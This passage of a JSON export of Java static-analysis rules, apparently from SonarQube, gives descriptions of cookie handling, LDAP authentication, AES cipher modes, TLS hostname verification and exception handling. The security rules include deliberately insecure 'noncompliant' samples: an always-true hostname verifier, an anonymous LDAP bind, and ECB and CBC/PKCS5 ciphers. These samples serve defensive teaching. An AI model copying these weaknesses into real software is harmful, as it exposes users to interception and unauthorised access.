cookies only for session IDs doesn't make them secure. Follow <a\nhref=\"https://www.owasp.org/index.php/Session_Management_Cheat_Sheet#Cookies\">OWASP best practices</a> when you configure your cookies.</p>\n<p>As a side note, every information read from a cookie should be <a\nhref=\"https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet\">Sanitized</a>.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\n// === javax.servlet ===\nimport javax.servlet.http.Cookie;\nimport javax.servlet.http.HttpServletResponse;\nimport javax.servlet.http.HttpServletRequest;\n\npublic class JavaxServlet {\n    void aServiceMethodSettingCookie(HttpServletRequest request, HttpServletResponse response, String acctID) {\n        Cookie cookie = new Cookie(\"userAccountID\", acctID);  // Sensitive\n        response.addCookie(cookie);  // Sensitive\n    }\n}\n</pre>\n<pre>\n// === javax.ws ===\nimport java.util.Date;\nimport javax.ws.rs.core.Cookie;\nimport javax.ws.rs.core.NewCookie;\n\nclass JavaxWs {\n    void jaxRsCookie(String comment, int maxAge, boolean secure, Date expiry, boolean httpOnly, String name,\n            String value, String path, String domain, int version) {\n        Cookie cookie= new Cookie(\"name\", \"value\");  // Sensitive\n\n        new NewCookie(cookie);  // Sensitive\n        new NewCookie(cookie, comment, maxAge, secure);  // Sensitive\n        new NewCookie(cookie, comment, maxAge, expiry, secure, httpOnly);  // Sensitive\n        new NewCookie(name, value);  // Sensitive\n        new NewCookie(name, value, path, domain, version, comment, maxAge, secure);  // Sensitive\n        new NewCookie(name, value, path, domain, version, comment, maxAge, expiry, secure, httpOnly);  // Sensitive\n        new NewCookie(name, value, path, domain, comment, maxAge, secure);  // Sensitive\n        new NewCookie(name, value, path, domain, comment, maxAge, secure, httpOnly);  // Sensitive\n    }\n}\n</pre>\n<pre>\n// === java.net ===\nimport java.net.HttpCookie;\n\nclass JavaNet {\n    void httpCookie(HttpCookie hc) {\n        HttpCookie cookie = new HttpCookie(\"name\", \"value\");  // Sensitive\n        cookie.setValue(\"value\");  // Sensitive\n    }\n}\n</pre>\n<pre>\n// === apache.shiro ===\nimport org.apache.shiro.web.servlet.SimpleCookie;\n\nclass ApacheShiro {\n\n    void shiroCookie(SimpleCookie cookie) {\n        SimpleCookie sc = new SimpleCookie(cookie);  // Sensitive\n        cookie.setValue(\"value\");  // Sensitive\n    }\n}\n</pre>\n<pre>\n// === Play ===\nimport play.mvc.Http.Cookie;\nimport play.mvc.Http.CookieBuilder;\n\n\nclass Play {\n    void playCookie() {\n        CookieBuilder builder = Cookie.builder(\"name\", \"value\");  // Sensitive\n        builder.withName(\"name\")\n          .withValue(\"value\")  // Sensitive\n          .build();\n\n    }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure\">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure\n  </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/312.html\">MITRE, CWE-312</a> - Cleartext Storage of Sensitive Information </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/315.html\">MITRE, CWE-315</a> - Cleartext Storage of Sensitive Information in a Cookie </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/display/java/FIO52-J.+Do+not+store+unencrypted+sensitive+information+on+the+client+side\">CERT,\n  FIO52-J.</a> - Do not store unencrypted sensitive information on the client side </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://find-sec-bugs.github.io/bugs.htm#COOKIE_USAGE\">COOKIE_USAGE</a> </li>\n</ul>\n<h2>Deprecated</h2>\n<p>This rule is deprecated, and will eventually be removed.</p>",
            "severity": "MINOR",
            "status": "DEPRECATED",
            "isTemplate": false,
            "tags": [],
            "sysTags": [],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "SECURITY_HOTSPOT"
        },
        {
            "key": "java:S2252",
            "repo": "java",
            "name": "Loop conditions should be true at least once",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>If a <code>for</code> loop's condition is false before the first loop iteration, the loop will never be executed. Such loops are almost always\nbugs, particularly when the initial value and stop conditions are hard-coded.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nfor (int i = 10; i &lt; 10; i++) {  // Noncompliant\n  // ...\n</pre>",
            "mdDesc": "<p>If a <code>for</code> loop's condition is false before the first loop iteration, the loop will never be executed. Such loops are almost always\nbugs, particularly when the initial value and stop conditions are hard-coded.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nfor (int i = 10; i &lt; 10; i++) {  // Noncompliant\n  // ...\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "10min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "10min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "10min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "10min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S4433",
            "repo": "java",
            "name": "LDAP connections should be authenticated",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>An LDAP client authenticates to an LDAP server with a \"bind request\" which provides, among other, a <a\nhref=\"https://ldapwiki.com/wiki/Simple%20Authentication\">simple authentication method</a>.</p>\n<p>Simple authentication in LDAP can be used with three different mechanisms:</p>\n<ul>\n  <li> <em>Anonymous Authentication Mechanism</em> by performing a bind request with a username and password value of zero length. </li>\n  <li> <em>Unauthenticated Authentication Mechanism</em> by performing a bind request with a password value of zero length. </li>\n  <li> <em>Name/Password Authentication Mechanism</em> by performing a bind request with a password value of non-zero length. </li>\n</ul>\n<p>Anonymous binds and unauthenticated binds allow access to information in the LDAP directory without providing a password, their use is therefore\nstrongly discouraged. </p>\n<h2>Noncompliant Code Example</h2>\n<p>This rule raises an issue when an LDAP connection is created with <code>Context.SECURITY_AUTHENTICATION</code> set to <code>\"none\"</code>.</p>\n<pre>\n// Set up the environment for creating the initial context\nHashtable&lt;String, Object&gt; env = new Hashtable&lt;String, Object&gt;();\nenv.put(Context.INITIAL_CONTEXT_FACTORY, \"com.sun.jndi.ldap.LdapCtxFactory\");\nenv.put(Context.PROVIDER_URL, \"ldap://localhost:389/o=JNDITutorial\");\n\n// Use anonymous authentication\nenv.put(Context.SECURITY_AUTHENTICATION, \"none\"); // Noncompliant\n\n// Create the initial context\nDirContext ctx = new InitialDirContext(env);\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n// Set up the environment for creating the initial context\nHashtable&lt;String, Object&gt; env = new Hashtable&lt;String, Object&gt;();\nenv.put(Context.INITIAL_CONTEXT_FACTORY, \"com.sun.jndi.ldap.LdapCtxFactory\");\nenv.put(Context.PROVIDER_URL, \"ldap://localhost:389/o=JNDITutorial\");\n\n// Use simple authentication\nenv.put(Context.SECURITY_AUTHENTICATION, \"simple\");\nenv.put(Context.SECURITY_PRINCIPAL, \"cn=S. User, ou=NewHires, o=JNDITutorial\");\nenv.put(Context.SECURITY_CREDENTIALS, getLDAPPassword());\n\n// Create the initial context\nDirContext ctx = new InitialDirContext(env);\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A2-Broken_Authentication\">OWASP Top 10 2017 Category A2</a> - Broken Authentication </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/521.html\">CWE-521</a> - Weak Password Requirements </li>\n  <li> <a href=\"https://ldapwiki.com/wiki/Simple%20Authentication\">ldapwiki.com</a>- Simple Authentication </li>\n</ul>",
            "mdDesc": "<p>An LDAP client authenticates to an LDAP server with a \"bind request\" which provides, among other, a <a\nhref=\"https://ldapwiki.com/wiki/Simple%20Authentication\">simple authentication method</a>.</p>\n<p>Simple authentication in LDAP can be used with three different mechanisms:</p>\n<ul>\n  <li> <em>Anonymous Authentication Mechanism</em> by performing a bind request with a username and password value of zero length. </li>\n  <li> <em>Unauthenticated Authentication Mechanism</em> by performing a bind request with a password value of zero length. </li>\n  <li> <em>Name/Password Authentication Mechanism</em> by performing a bind request with a password value of non-zero length. </li>\n</ul>\n<p>Anonymous binds and unauthenticated binds allow access to information in the LDAP directory without providing a password, their use is therefore\nstrongly discouraged. </p>\n<h2>Noncompliant Code Example</h2>\n<p>This rule raises an issue when an LDAP connection is created with <code>Context.SECURITY_AUTHENTICATION</code> set to <code>\"none\"</code>.</p>\n<pre>\n// Set up the environment for creating the initial context\nHashtable&lt;String, Object&gt; env = new Hashtable&lt;String, Object&gt;();\nenv.put(Context.INITIAL_CONTEXT_FACTORY, \"com.sun.jndi.ldap.LdapCtxFactory\");\nenv.put(Context.PROVIDER_URL, \"ldap://localhost:389/o=JNDITutorial\");\n\n// Use anonymous authentication\nenv.put(Context.SECURITY_AUTHENTICATION, \"none\"); // Noncompliant\n\n// Create the initial context\nDirContext ctx = new InitialDirContext(env);\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n// Set up the environment for creating the initial context\nHashtable&lt;String, Object&gt; env = new Hashtable&lt;String, Object&gt;();\nenv.put(Context.INITIAL_CONTEXT_FACTORY, \"com.sun.jndi.ldap.LdapCtxFactory\");\nenv.put(Context.PROVIDER_URL, \"ldap://localhost:389/o=JNDITutorial\");\n\n// Use simple authentication\nenv.put(Context.SECURITY_AUTHENTICATION, \"simple\");\nenv.put(Context.SECURITY_PRINCIPAL, \"cn=S. User, ou=NewHires, o=JNDITutorial\");\nenv.put(Context.SECURITY_CREDENTIALS, getLDAPPassword());\n\n// Create the initial context\nDirContext ctx = new InitialDirContext(env);\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A2-Broken_Authentication\">OWASP Top 10 2017 Category A2</a> - Broken Authentication </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/521.html\">CWE-521</a> - Weak Password Requirements </li>\n  <li> <a href=\"https://ldapwiki.com/wiki/Simple%20Authentication\">ldapwiki.com</a>- Simple Authentication </li>\n</ul>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cwe",
                "owasp-a2"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "15min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "15min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "15min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "15min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "VULNERABILITY"
        },
        {
            "key": "java:S1163",
            "repo": "java",
            "name": "Exceptions should not be thrown in finally blocks",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Throwing an exception from within a finally block will mask any exception which was previously thrown in the <code>try</code> or <code>catch</code>\nblock, and the masked's exception message and stack trace will be lost.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\ntry {\n  /* some work which end up throwing an exception */\n  throw new IllegalArgumentException();\n} finally {\n  /* clean up */\n  throw new RuntimeException();       // Noncompliant; masks the IllegalArgumentException\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\ntry {\n  /* some work which end up throwing an exception */\n  throw new IllegalArgumentException();\n} finally {\n  /* clean up */\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/FTZGBQ\">CERT, ERR05-J.</a> - Do not let checked exceptions escape from a finally block </li>\n</ul>",
            "mdDesc": "<p>Throwing an exception from within a finally block will mask any exception which was previously thrown in the <code>try</code> or <code>catch</code>\nblock, and the masked's exception message and stack trace will be lost.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\ntry {\n  /* some work which end up throwing an exception */\n  throw new IllegalArgumentException();\n} finally {\n  /* clean up */\n  throw new RuntimeException();       // Noncompliant; masks the IllegalArgumentException\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\ntry {\n  /* some work which end up throwing an exception */\n  throw new IllegalArgumentException();\n} finally {\n  /* clean up */\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/FTZGBQ\">CERT, ERR05-J.</a> - Do not let checked exceptions escape from a finally block </li>\n</ul>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert",
                "error-handling",
                "suspicious"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "30min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "30min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "30min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "30min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2253",
            "repo": "java",
            "name": "Track uses of disallowed methods",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>This rule allows banning certain methods.</p>\n<h2>Noncompliant Code Example</h2>\n<p>Given parameters:</p>\n<ul>\n  <li> className:java.lang.String </li>\n  <li> methodName: replace </li>\n  <li> argumentTypes: java.lang.CharSequence, java.lang.CharSequence </li>\n</ul>\n<pre>\nString name;\nname.replace(\"A\",\"a\");  // Noncompliant\n</pre>",
            "mdDesc": "<p>This rule allows banning certain methods.</p>\n<h2>Noncompliant Code Example</h2>\n<p>Given parameters:</p>\n<ul>\n  <li> className:java.lang.String </li>\n  <li> methodName: replace </li>\n  <li> argumentTypes: java.lang.CharSequence, java.lang.CharSequence </li>\n</ul>\n<pre>\nString name;\nname.replace(\"A\",\"a\");  // Noncompliant\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": true,
            "tags": [],
            "sysTags": [],
            "lang": "java",
            "langName": "Java",
            "params": [
                {
                    "key": "methodName",
                    "htmlDesc": "Name of the forbidden method",
                    "type": "STRING"
                },
                {
                    "key": "className",
                    "htmlDesc": "Name of the class whose method is forbidden",
                    "type": "STRING"
                },
                {
                    "key": "argumentTypes",
                    "htmlDesc": "Comma-delimited list of argument types, E.G. java.lang.String, int[], int",
                    "type": "STRING"
                },
                {
                    "key": "allOverloads",
                    "htmlDesc": "Set to true to flag all overloads regardless of parameter type",
                    "defaultValue": "false",
                    "type": "BOOLEAN"
                }
            ],
            "debtOverloaded": false,
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S4432",
            "repo": "java",
            "name": "AES encryption algorithm should be used with secured mode",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>The Advanced Encryption Standard (AES) encryption algorithm can be used with various modes. Some combinations are not secured:</p>\n<ul>\n  <li> Electronic Codebook (ECB) mode: Under a given key, any given plaintext block always gets encrypted to the same ciphertext block. Thus, it does\n  not hide data patterns well. In some senses, it doesn't provide serious message confidentiality, and it is not recommended for use in cryptographic\n  protocols at all. </li>\n  <li> Cipher Block Chaining (CBC) with PKCS#5 padding (or PKCS#7) is susceptible to padding oracle attacks. </li>\n</ul>\n<p>In both cases, Galois/Counter Mode (GCM) with no padding should be preferred.</p>\n<p>This rule raises an issue when a <code>Cipher</code> instance is created with either ECB or CBC/PKCS5Padding mode.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nCipher c1 = Cipher.getInstance(\"AES/ECB/NoPadding\"); // Noncompliant\nCipher c2 = Cipher.getInstance(\"AES/CBC/PKCS5Padding\"); // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nCipher c = Cipher.getInstance(\"AES/GCM/NoPadding\");\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration\">OWASP Top 10 2017 Category A6</a> - Security\n  Misconfiguration </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/327.html\">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/hDdGBQ\">CERT, MSC61-J.</a> - Do not use insecure or weak cryptographic algorithms </li>\n  <li> <a href=\"https://www.sans.org/top25-software-errors/#cat3\">SANS Top 25</a> - Porous Defenses </li>\n  <li> <a href=\"https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-38a.pdf\">Recommendation for Block Cipher Modes of Operation</a>\n  </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://find-sec-bugs.github.io/bugs.htm#ECB_MODE\">ECB_MODE</a> </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://find-sec-bugs.github.io/bugs.htm#PADDING_ORACLE\">PADDING_ORACLE</a> </li>\n</ul>\n<h2>Deprecated</h2>\n<p>This rule is deprecated; use <a href='/coding_rules#rule_key=java%3AS5542'>S5542</a> instead.</p>",
            "mdDesc": "<p>The Advanced Encryption Standard (AES) encryption algorithm can be used with various modes. Some combinations are not secured:</p>\n<ul>\n  <li> Electronic Codebook (ECB) mode: Under a given key, any given plaintext block always gets encrypted to the same ciphertext block. Thus, it does\n  not hide data patterns well. In some senses, it doesn't provide serious message confidentiality, and it is not recommended for use in cryptographic\n  protocols at all. </li>\n  <li> Cipher Block Chaining (CBC) with PKCS#5 padding (or PKCS#7) is susceptible to padding oracle attacks. </li>\n</ul>\n<p>In both cases, Galois/Counter Mode (GCM) with no padding should be preferred.</p>\n<p>This rule raises an issue when a <code>Cipher</code> instance is created with either ECB or CBC/PKCS5Padding mode.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nCipher c1 = Cipher.getInstance(\"AES/ECB/NoPadding\"); // Noncompliant\nCipher c2 = Cipher.getInstance(\"AES/CBC/PKCS5Padding\"); // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nCipher c = Cipher.getInstance(\"AES/GCM/NoPadding\");\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration\">OWASP Top 10 2017 Category A6</a> - Security\n  Misconfiguration </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/327.html\">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/hDdGBQ\">CERT, MSC61-J.</a> - Do not use insecure or weak cryptographic algorithms </li>\n  <li> <a href=\"https://www.sans.org/top25-software-errors/#cat3\">SANS Top 25</a> - Porous Defenses </li>\n  <li> <a href=\"https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-38a.pdf\">Recommendation for Block Cipher Modes of Operation</a>\n  </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://find-sec-bugs.github.io/bugs.htm#ECB_MODE\">ECB_MODE</a> </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://find-sec-bugs.github.io/bugs.htm#PADDING_ORACLE\">PADDING_ORACLE</a> </li>\n</ul>\n<h2>Deprecated</h2>\n<p>This rule is deprecated; use {rule:java:S5542} instead.</p>",
            "severity": "CRITICAL",
            "status": "DEPRECATED",
            "isTemplate": false,
            "tags": [],
            "sysTags": [],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "2min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "2min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "2min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "2min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "VULNERABILITY"
        },
        {
            "key": "java:S2139",
            "repo": "java",
            "name": "Exceptions should be either logged or rethrown but not both",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>In applications where the accepted practice is to log an <code>Exception</code> and then rethrow it, you end up with miles-long logs that contain\nmultiple instances of the same exception. In multi-threaded applications debugging this type of log can be particularly hellish because messages from\nother threads will be interwoven with the repetitions of the logged-and-thrown <code>Exception</code>. Instead, exceptions should be either logged or\nrethrown, not both.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\ncatch (SQLException e) {\n  ...\n  LOGGER.log(Level.ERROR,  contextInfo, e);\n  throw new MySQLException(contextInfo, e);\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\ncatch (SQLException e) {\n  ...\n  throw new MySQLException(contextInfo, e);\n}\n</pre>\n<p>or </p>\n<pre>\ncatch (SQLException e) {\n  ...\n  LOGGER.log(Level.ERROR,  contextInfo, e);\n  // handle exception...\n}\n</pre>",
            "mdDesc": "<p>In applications where the accepted practice is to log an <code>Exception</code> and then rethrow it, you end up with miles-long logs that contain\nmultiple instances of the same exception. In multi-threaded applications debugging this type of log can be particularly hellish because messages from\nother threads will be interwoven with the repetitions of the logged-and-thrown <code>Exception</code>. Instead, exceptions should be either logged or\nrethrown, not both.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\ncatch (SQLException e) {\n  ...\n  LOGGER.log(Level.ERROR,  contextInfo, e);\n  throw new MySQLException(contextInfo, e);\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\ncatch (SQLException e) {\n  ...\n  throw new MySQLException(contextInfo, e);\n}\n</pre>\n<p>or </p>\n<pre>\ncatch (SQLException e) {\n  ...\n  LOGGER.log(Level.ERROR,  contextInfo, e);\n  // handle exception...\n}\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "clumsy",
                "error-handling"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "15min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "15min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "15min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "15min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S5527",
            "repo": "java",
            "name": "Server hostnames should be verified during SSL/TLS connections",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>To establish a SSL/TLS connection not vulnerable to man-in-the-middle attacks, it's essential to make sure the server presents the right\ncertificate.</p>\n<p>The certificate's hostname-specific data should match the server hostname.</p>\n<p>It's not recommended to re-invent the wheel by implementing custom hostname verification.</p>\n<p>TLS/SSL libraries provide built-in hostname verification functions that should be used.</p>\n<p>This rule raises an issue when:</p>\n<ul>\n  <li> <code>HostnameVerifier.verify()</code> method always <code>return true</code> </li>\n  <li> a JavaMail's <code>javax.mail.Session</code> is created with a <code>Properties</code> object having no\n  <code>mail.smtp.ssl.checkserveridentity</code> or <code>mail.smtps.ssl.checkserveridentity</code> not configured to <code>true</code> </li>\n  <li> a Apache Common Emails's <code>org.apache.commons.mail.SimpleEmail</code> is used with <code>setSSLOnConnect(true)</code> or\n  <code>setStartTLSEnabled(true)</code> or <code>setStartTLSRequired(true)</code> without a call to <code>setSSLCheckServerIdentity(true)</code> </li>\n</ul>\n<h2>Noncompliant Code Example</h2>\n<pre>\nURL url = new URL(\"https://example.org/\");\nHttpsURLConnection urlConnection = (HttpsURLConnection)url.openConnection();\nurlConnection.setHostnameVerifier(new HostnameVerifier() {\n  @Override\n  public boolean verify(String requestedHost, SSLSession remoteServerSession) {\n    return true;  // Noncompliant\n  }\n});\nInputStream in = urlConnection.getInputStream();\n\n</pre>\n<p>SimpleEmail example:</p>\n<pre>\nEmail email = new SimpleEmail();\nemail.setSmtpPort(465);\nemail.setAuthenticator(new DefaultAuthenticator(username, password));\nemail.setSSLOnConnect(true); // Noncompliant; setSSLCheckServerIdentity(true) should also be called before sending the email\nemail.send();\n</pre>\n<p>JavaMail's example:</p>\n<pre>\nProperties props = new Properties();\nprops.put(\"mail.smtp.host\", \"smtp.gmail.com\");\nprops.put(\"mail.smtp.socketFactory.port\", \"465\");\nprops.put(\"mail.smtp.socketFactory.class\", \"javax.net.ssl.SSLSocketFactory\"); // Noncompliant; Session is created without having \"mail.smtp.ssl.checkserveridentity\" set to true\nprops.put(\"mail.smtp.auth\", \"true\");\nprops.put(\"mail.smtp.port\", \"465\");\nSession session = Session.getDefaultInstance(props, new javax.mail.Authenticator() {\n  protected PasswordAuthentication getPasswordAuthentication() {\n    return new PasswordAuthentication(\"username@gmail.com\", \"password\");\n  }\n});\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nURL url = new URL(\"https://example.org/\");\nHttpsURLConnection urlConnection = (HttpsURLConnection)url.openConnection();\n// Compliant; Use the default HostnameVerifier\nInputStream in = urlConnection.getInputStream();\n</pre>\n<p>SimpleEmail example:</p>\n<pre>\nEmail email = new SimpleEmail();\nemail.setSmtpPort(465);\nemail.setAuthenticator(new DefaultAuthenticator(username, password));\nemail.setSSLOnConnect(true);\nemail.setSSLCheckServerIdentity(true); // Compliant\nemail.send();\n</pre>\n<p>JavaMail's example:</p>\n<pre>\nProperties props = new Properties();\nprops.put(\"mail.smtp.host\", \"smtp.gmail.com\");\nprops.put(\"mail.smtp.socketFactory.port\", \"465\");\nprops.put(\"mail.smtp.socketFactory.class\", \"javax.net.ssl.SSLSocketFactory\");\nprops.put(\"mail.smtp.auth\", \"true\");\nprops.put(\"mail.smtp.port\", \"465\");\nprops.put(\"mail.smtp.ssl.checkserveridentity\", true); // Compliant\nSession session = Session.getDefaultInstance(props, new javax.mail.Authenticator() {\n  protected PasswordAuthentication getPasswordAuthentication() {\n    return new PasswordAuthentication(\"username@gmail.com\", \"password\");\n  }\n});\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration\">OWASP Top 10 2017 Category A6</a> - Security\n  Misconfiguration </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/295.html\">MITRE, CWE-295</a> - Improper Certificate Validation </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://find-sec-bugs.github.io/bugs.htm#WEAK_HOSTNAME_VERIFIER\">WEAK_HOSTNAME_VERIFIER</a> </li>\n</ul>",
            "mdDesc": "<p>To establish a SSL/TLS connection not vulnerable to man-in-the-middle attacks, it's essential to make sure the server presents the right\ncertificate.</p>\n<p>The certificate's hostname-specific data should match the server hostname.</p>\n<p>It's not recommended to re-invent the wheel by implementing custom hostname verification.</p>\n<p>TLS/SSL libraries provide built-in hostname verification functions that should be used.</p>\n<p>This rule raises an issue when:</p>\n<ul>\n  <li> <code>HostnameVerifier.verify()</code> method always <code>return true</code> </li>\n  <li> a JavaMail's <code>javax.mail.Session</code> is created with a <code>Properties</code> object having no\n  <code>mail.smtp.ssl.checkserveridentity</code> or <code>mail.smtps.ssl.checkserveridentity</code> not configured to <code>true</code> </li>\n  <li> a Apache Common Emails's <code>org.apache.commons.mail.SimpleEmail</code> is used with <code>setSSLOnConnect(true)</code> or\n  <code>setStartTLSEnabled(true)</code> or <code>setStartTLSRequired(true)</code> without a call to <code>setSSLCheckServerIdentity(true)</code> </li>\n</ul>\n<h2>Noncompliant Code Example</h2>\n<pre>\nURL url = new URL(\"https://example.org/\");\nHttpsURLConnection urlConnection = (HttpsURLConnection)url.openConnection();\nurlConnection.setHostnameVerifier(new HostnameVerifier() {\n  @Override\n  public boolean verify(String requestedHost, SSLSession remoteServerSession) {\n    return true;  // Noncompliant\n  }\n});\nInputStream in = urlConnection.getInputStream();\n\n</pre>\n<p>SimpleEmail example:</p>\n<pre>\nEmail email = new SimpleEmail();\nemail.setSmtpPort(465);\nemail.setAuthenticator(new DefaultAuthenticator(username, password));\nemail.setSSLOnConnect(true); // Noncompliant; setSSLCheckServerIdentity(true) should also be called before sending the email\nemail.send();\n</pre>\n<p>JavaMail's example:</p>\n<pre>\nProperties props = new Properties();\nprops.put(\"mail.smtp.host\", \"smtp.gmail.com\");\nprops.put(\"mail.smtp.socketFactory.port\", \"465\");\nprops.put(\"mail.smtp.socketFactory.class\", \"javax.net.ssl.SSLSocketFactory\"); // Noncompliant; Session is created without having \"mail.smtp.ssl.checkserveridentity\" set to true\nprops.put(\"mail.smtp.auth\", \"true\");\nprops.put(\"mail.smtp.port\", \"465\");\nSession session = Session.getDefaultInstance(props, new javax.mail.Authenticator() {\n  protected PasswordAuthentication getPasswordAuthentication() {\n    return new PasswordAuthentication(\"username@gmail.com\", \"password\");\n  }\n});\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nURL url = new URL(\"https://example.org/\");\nHttpsURLConnection urlConnection = (HttpsURLConnection)url.openConnection();\n// Compliant; Use the default 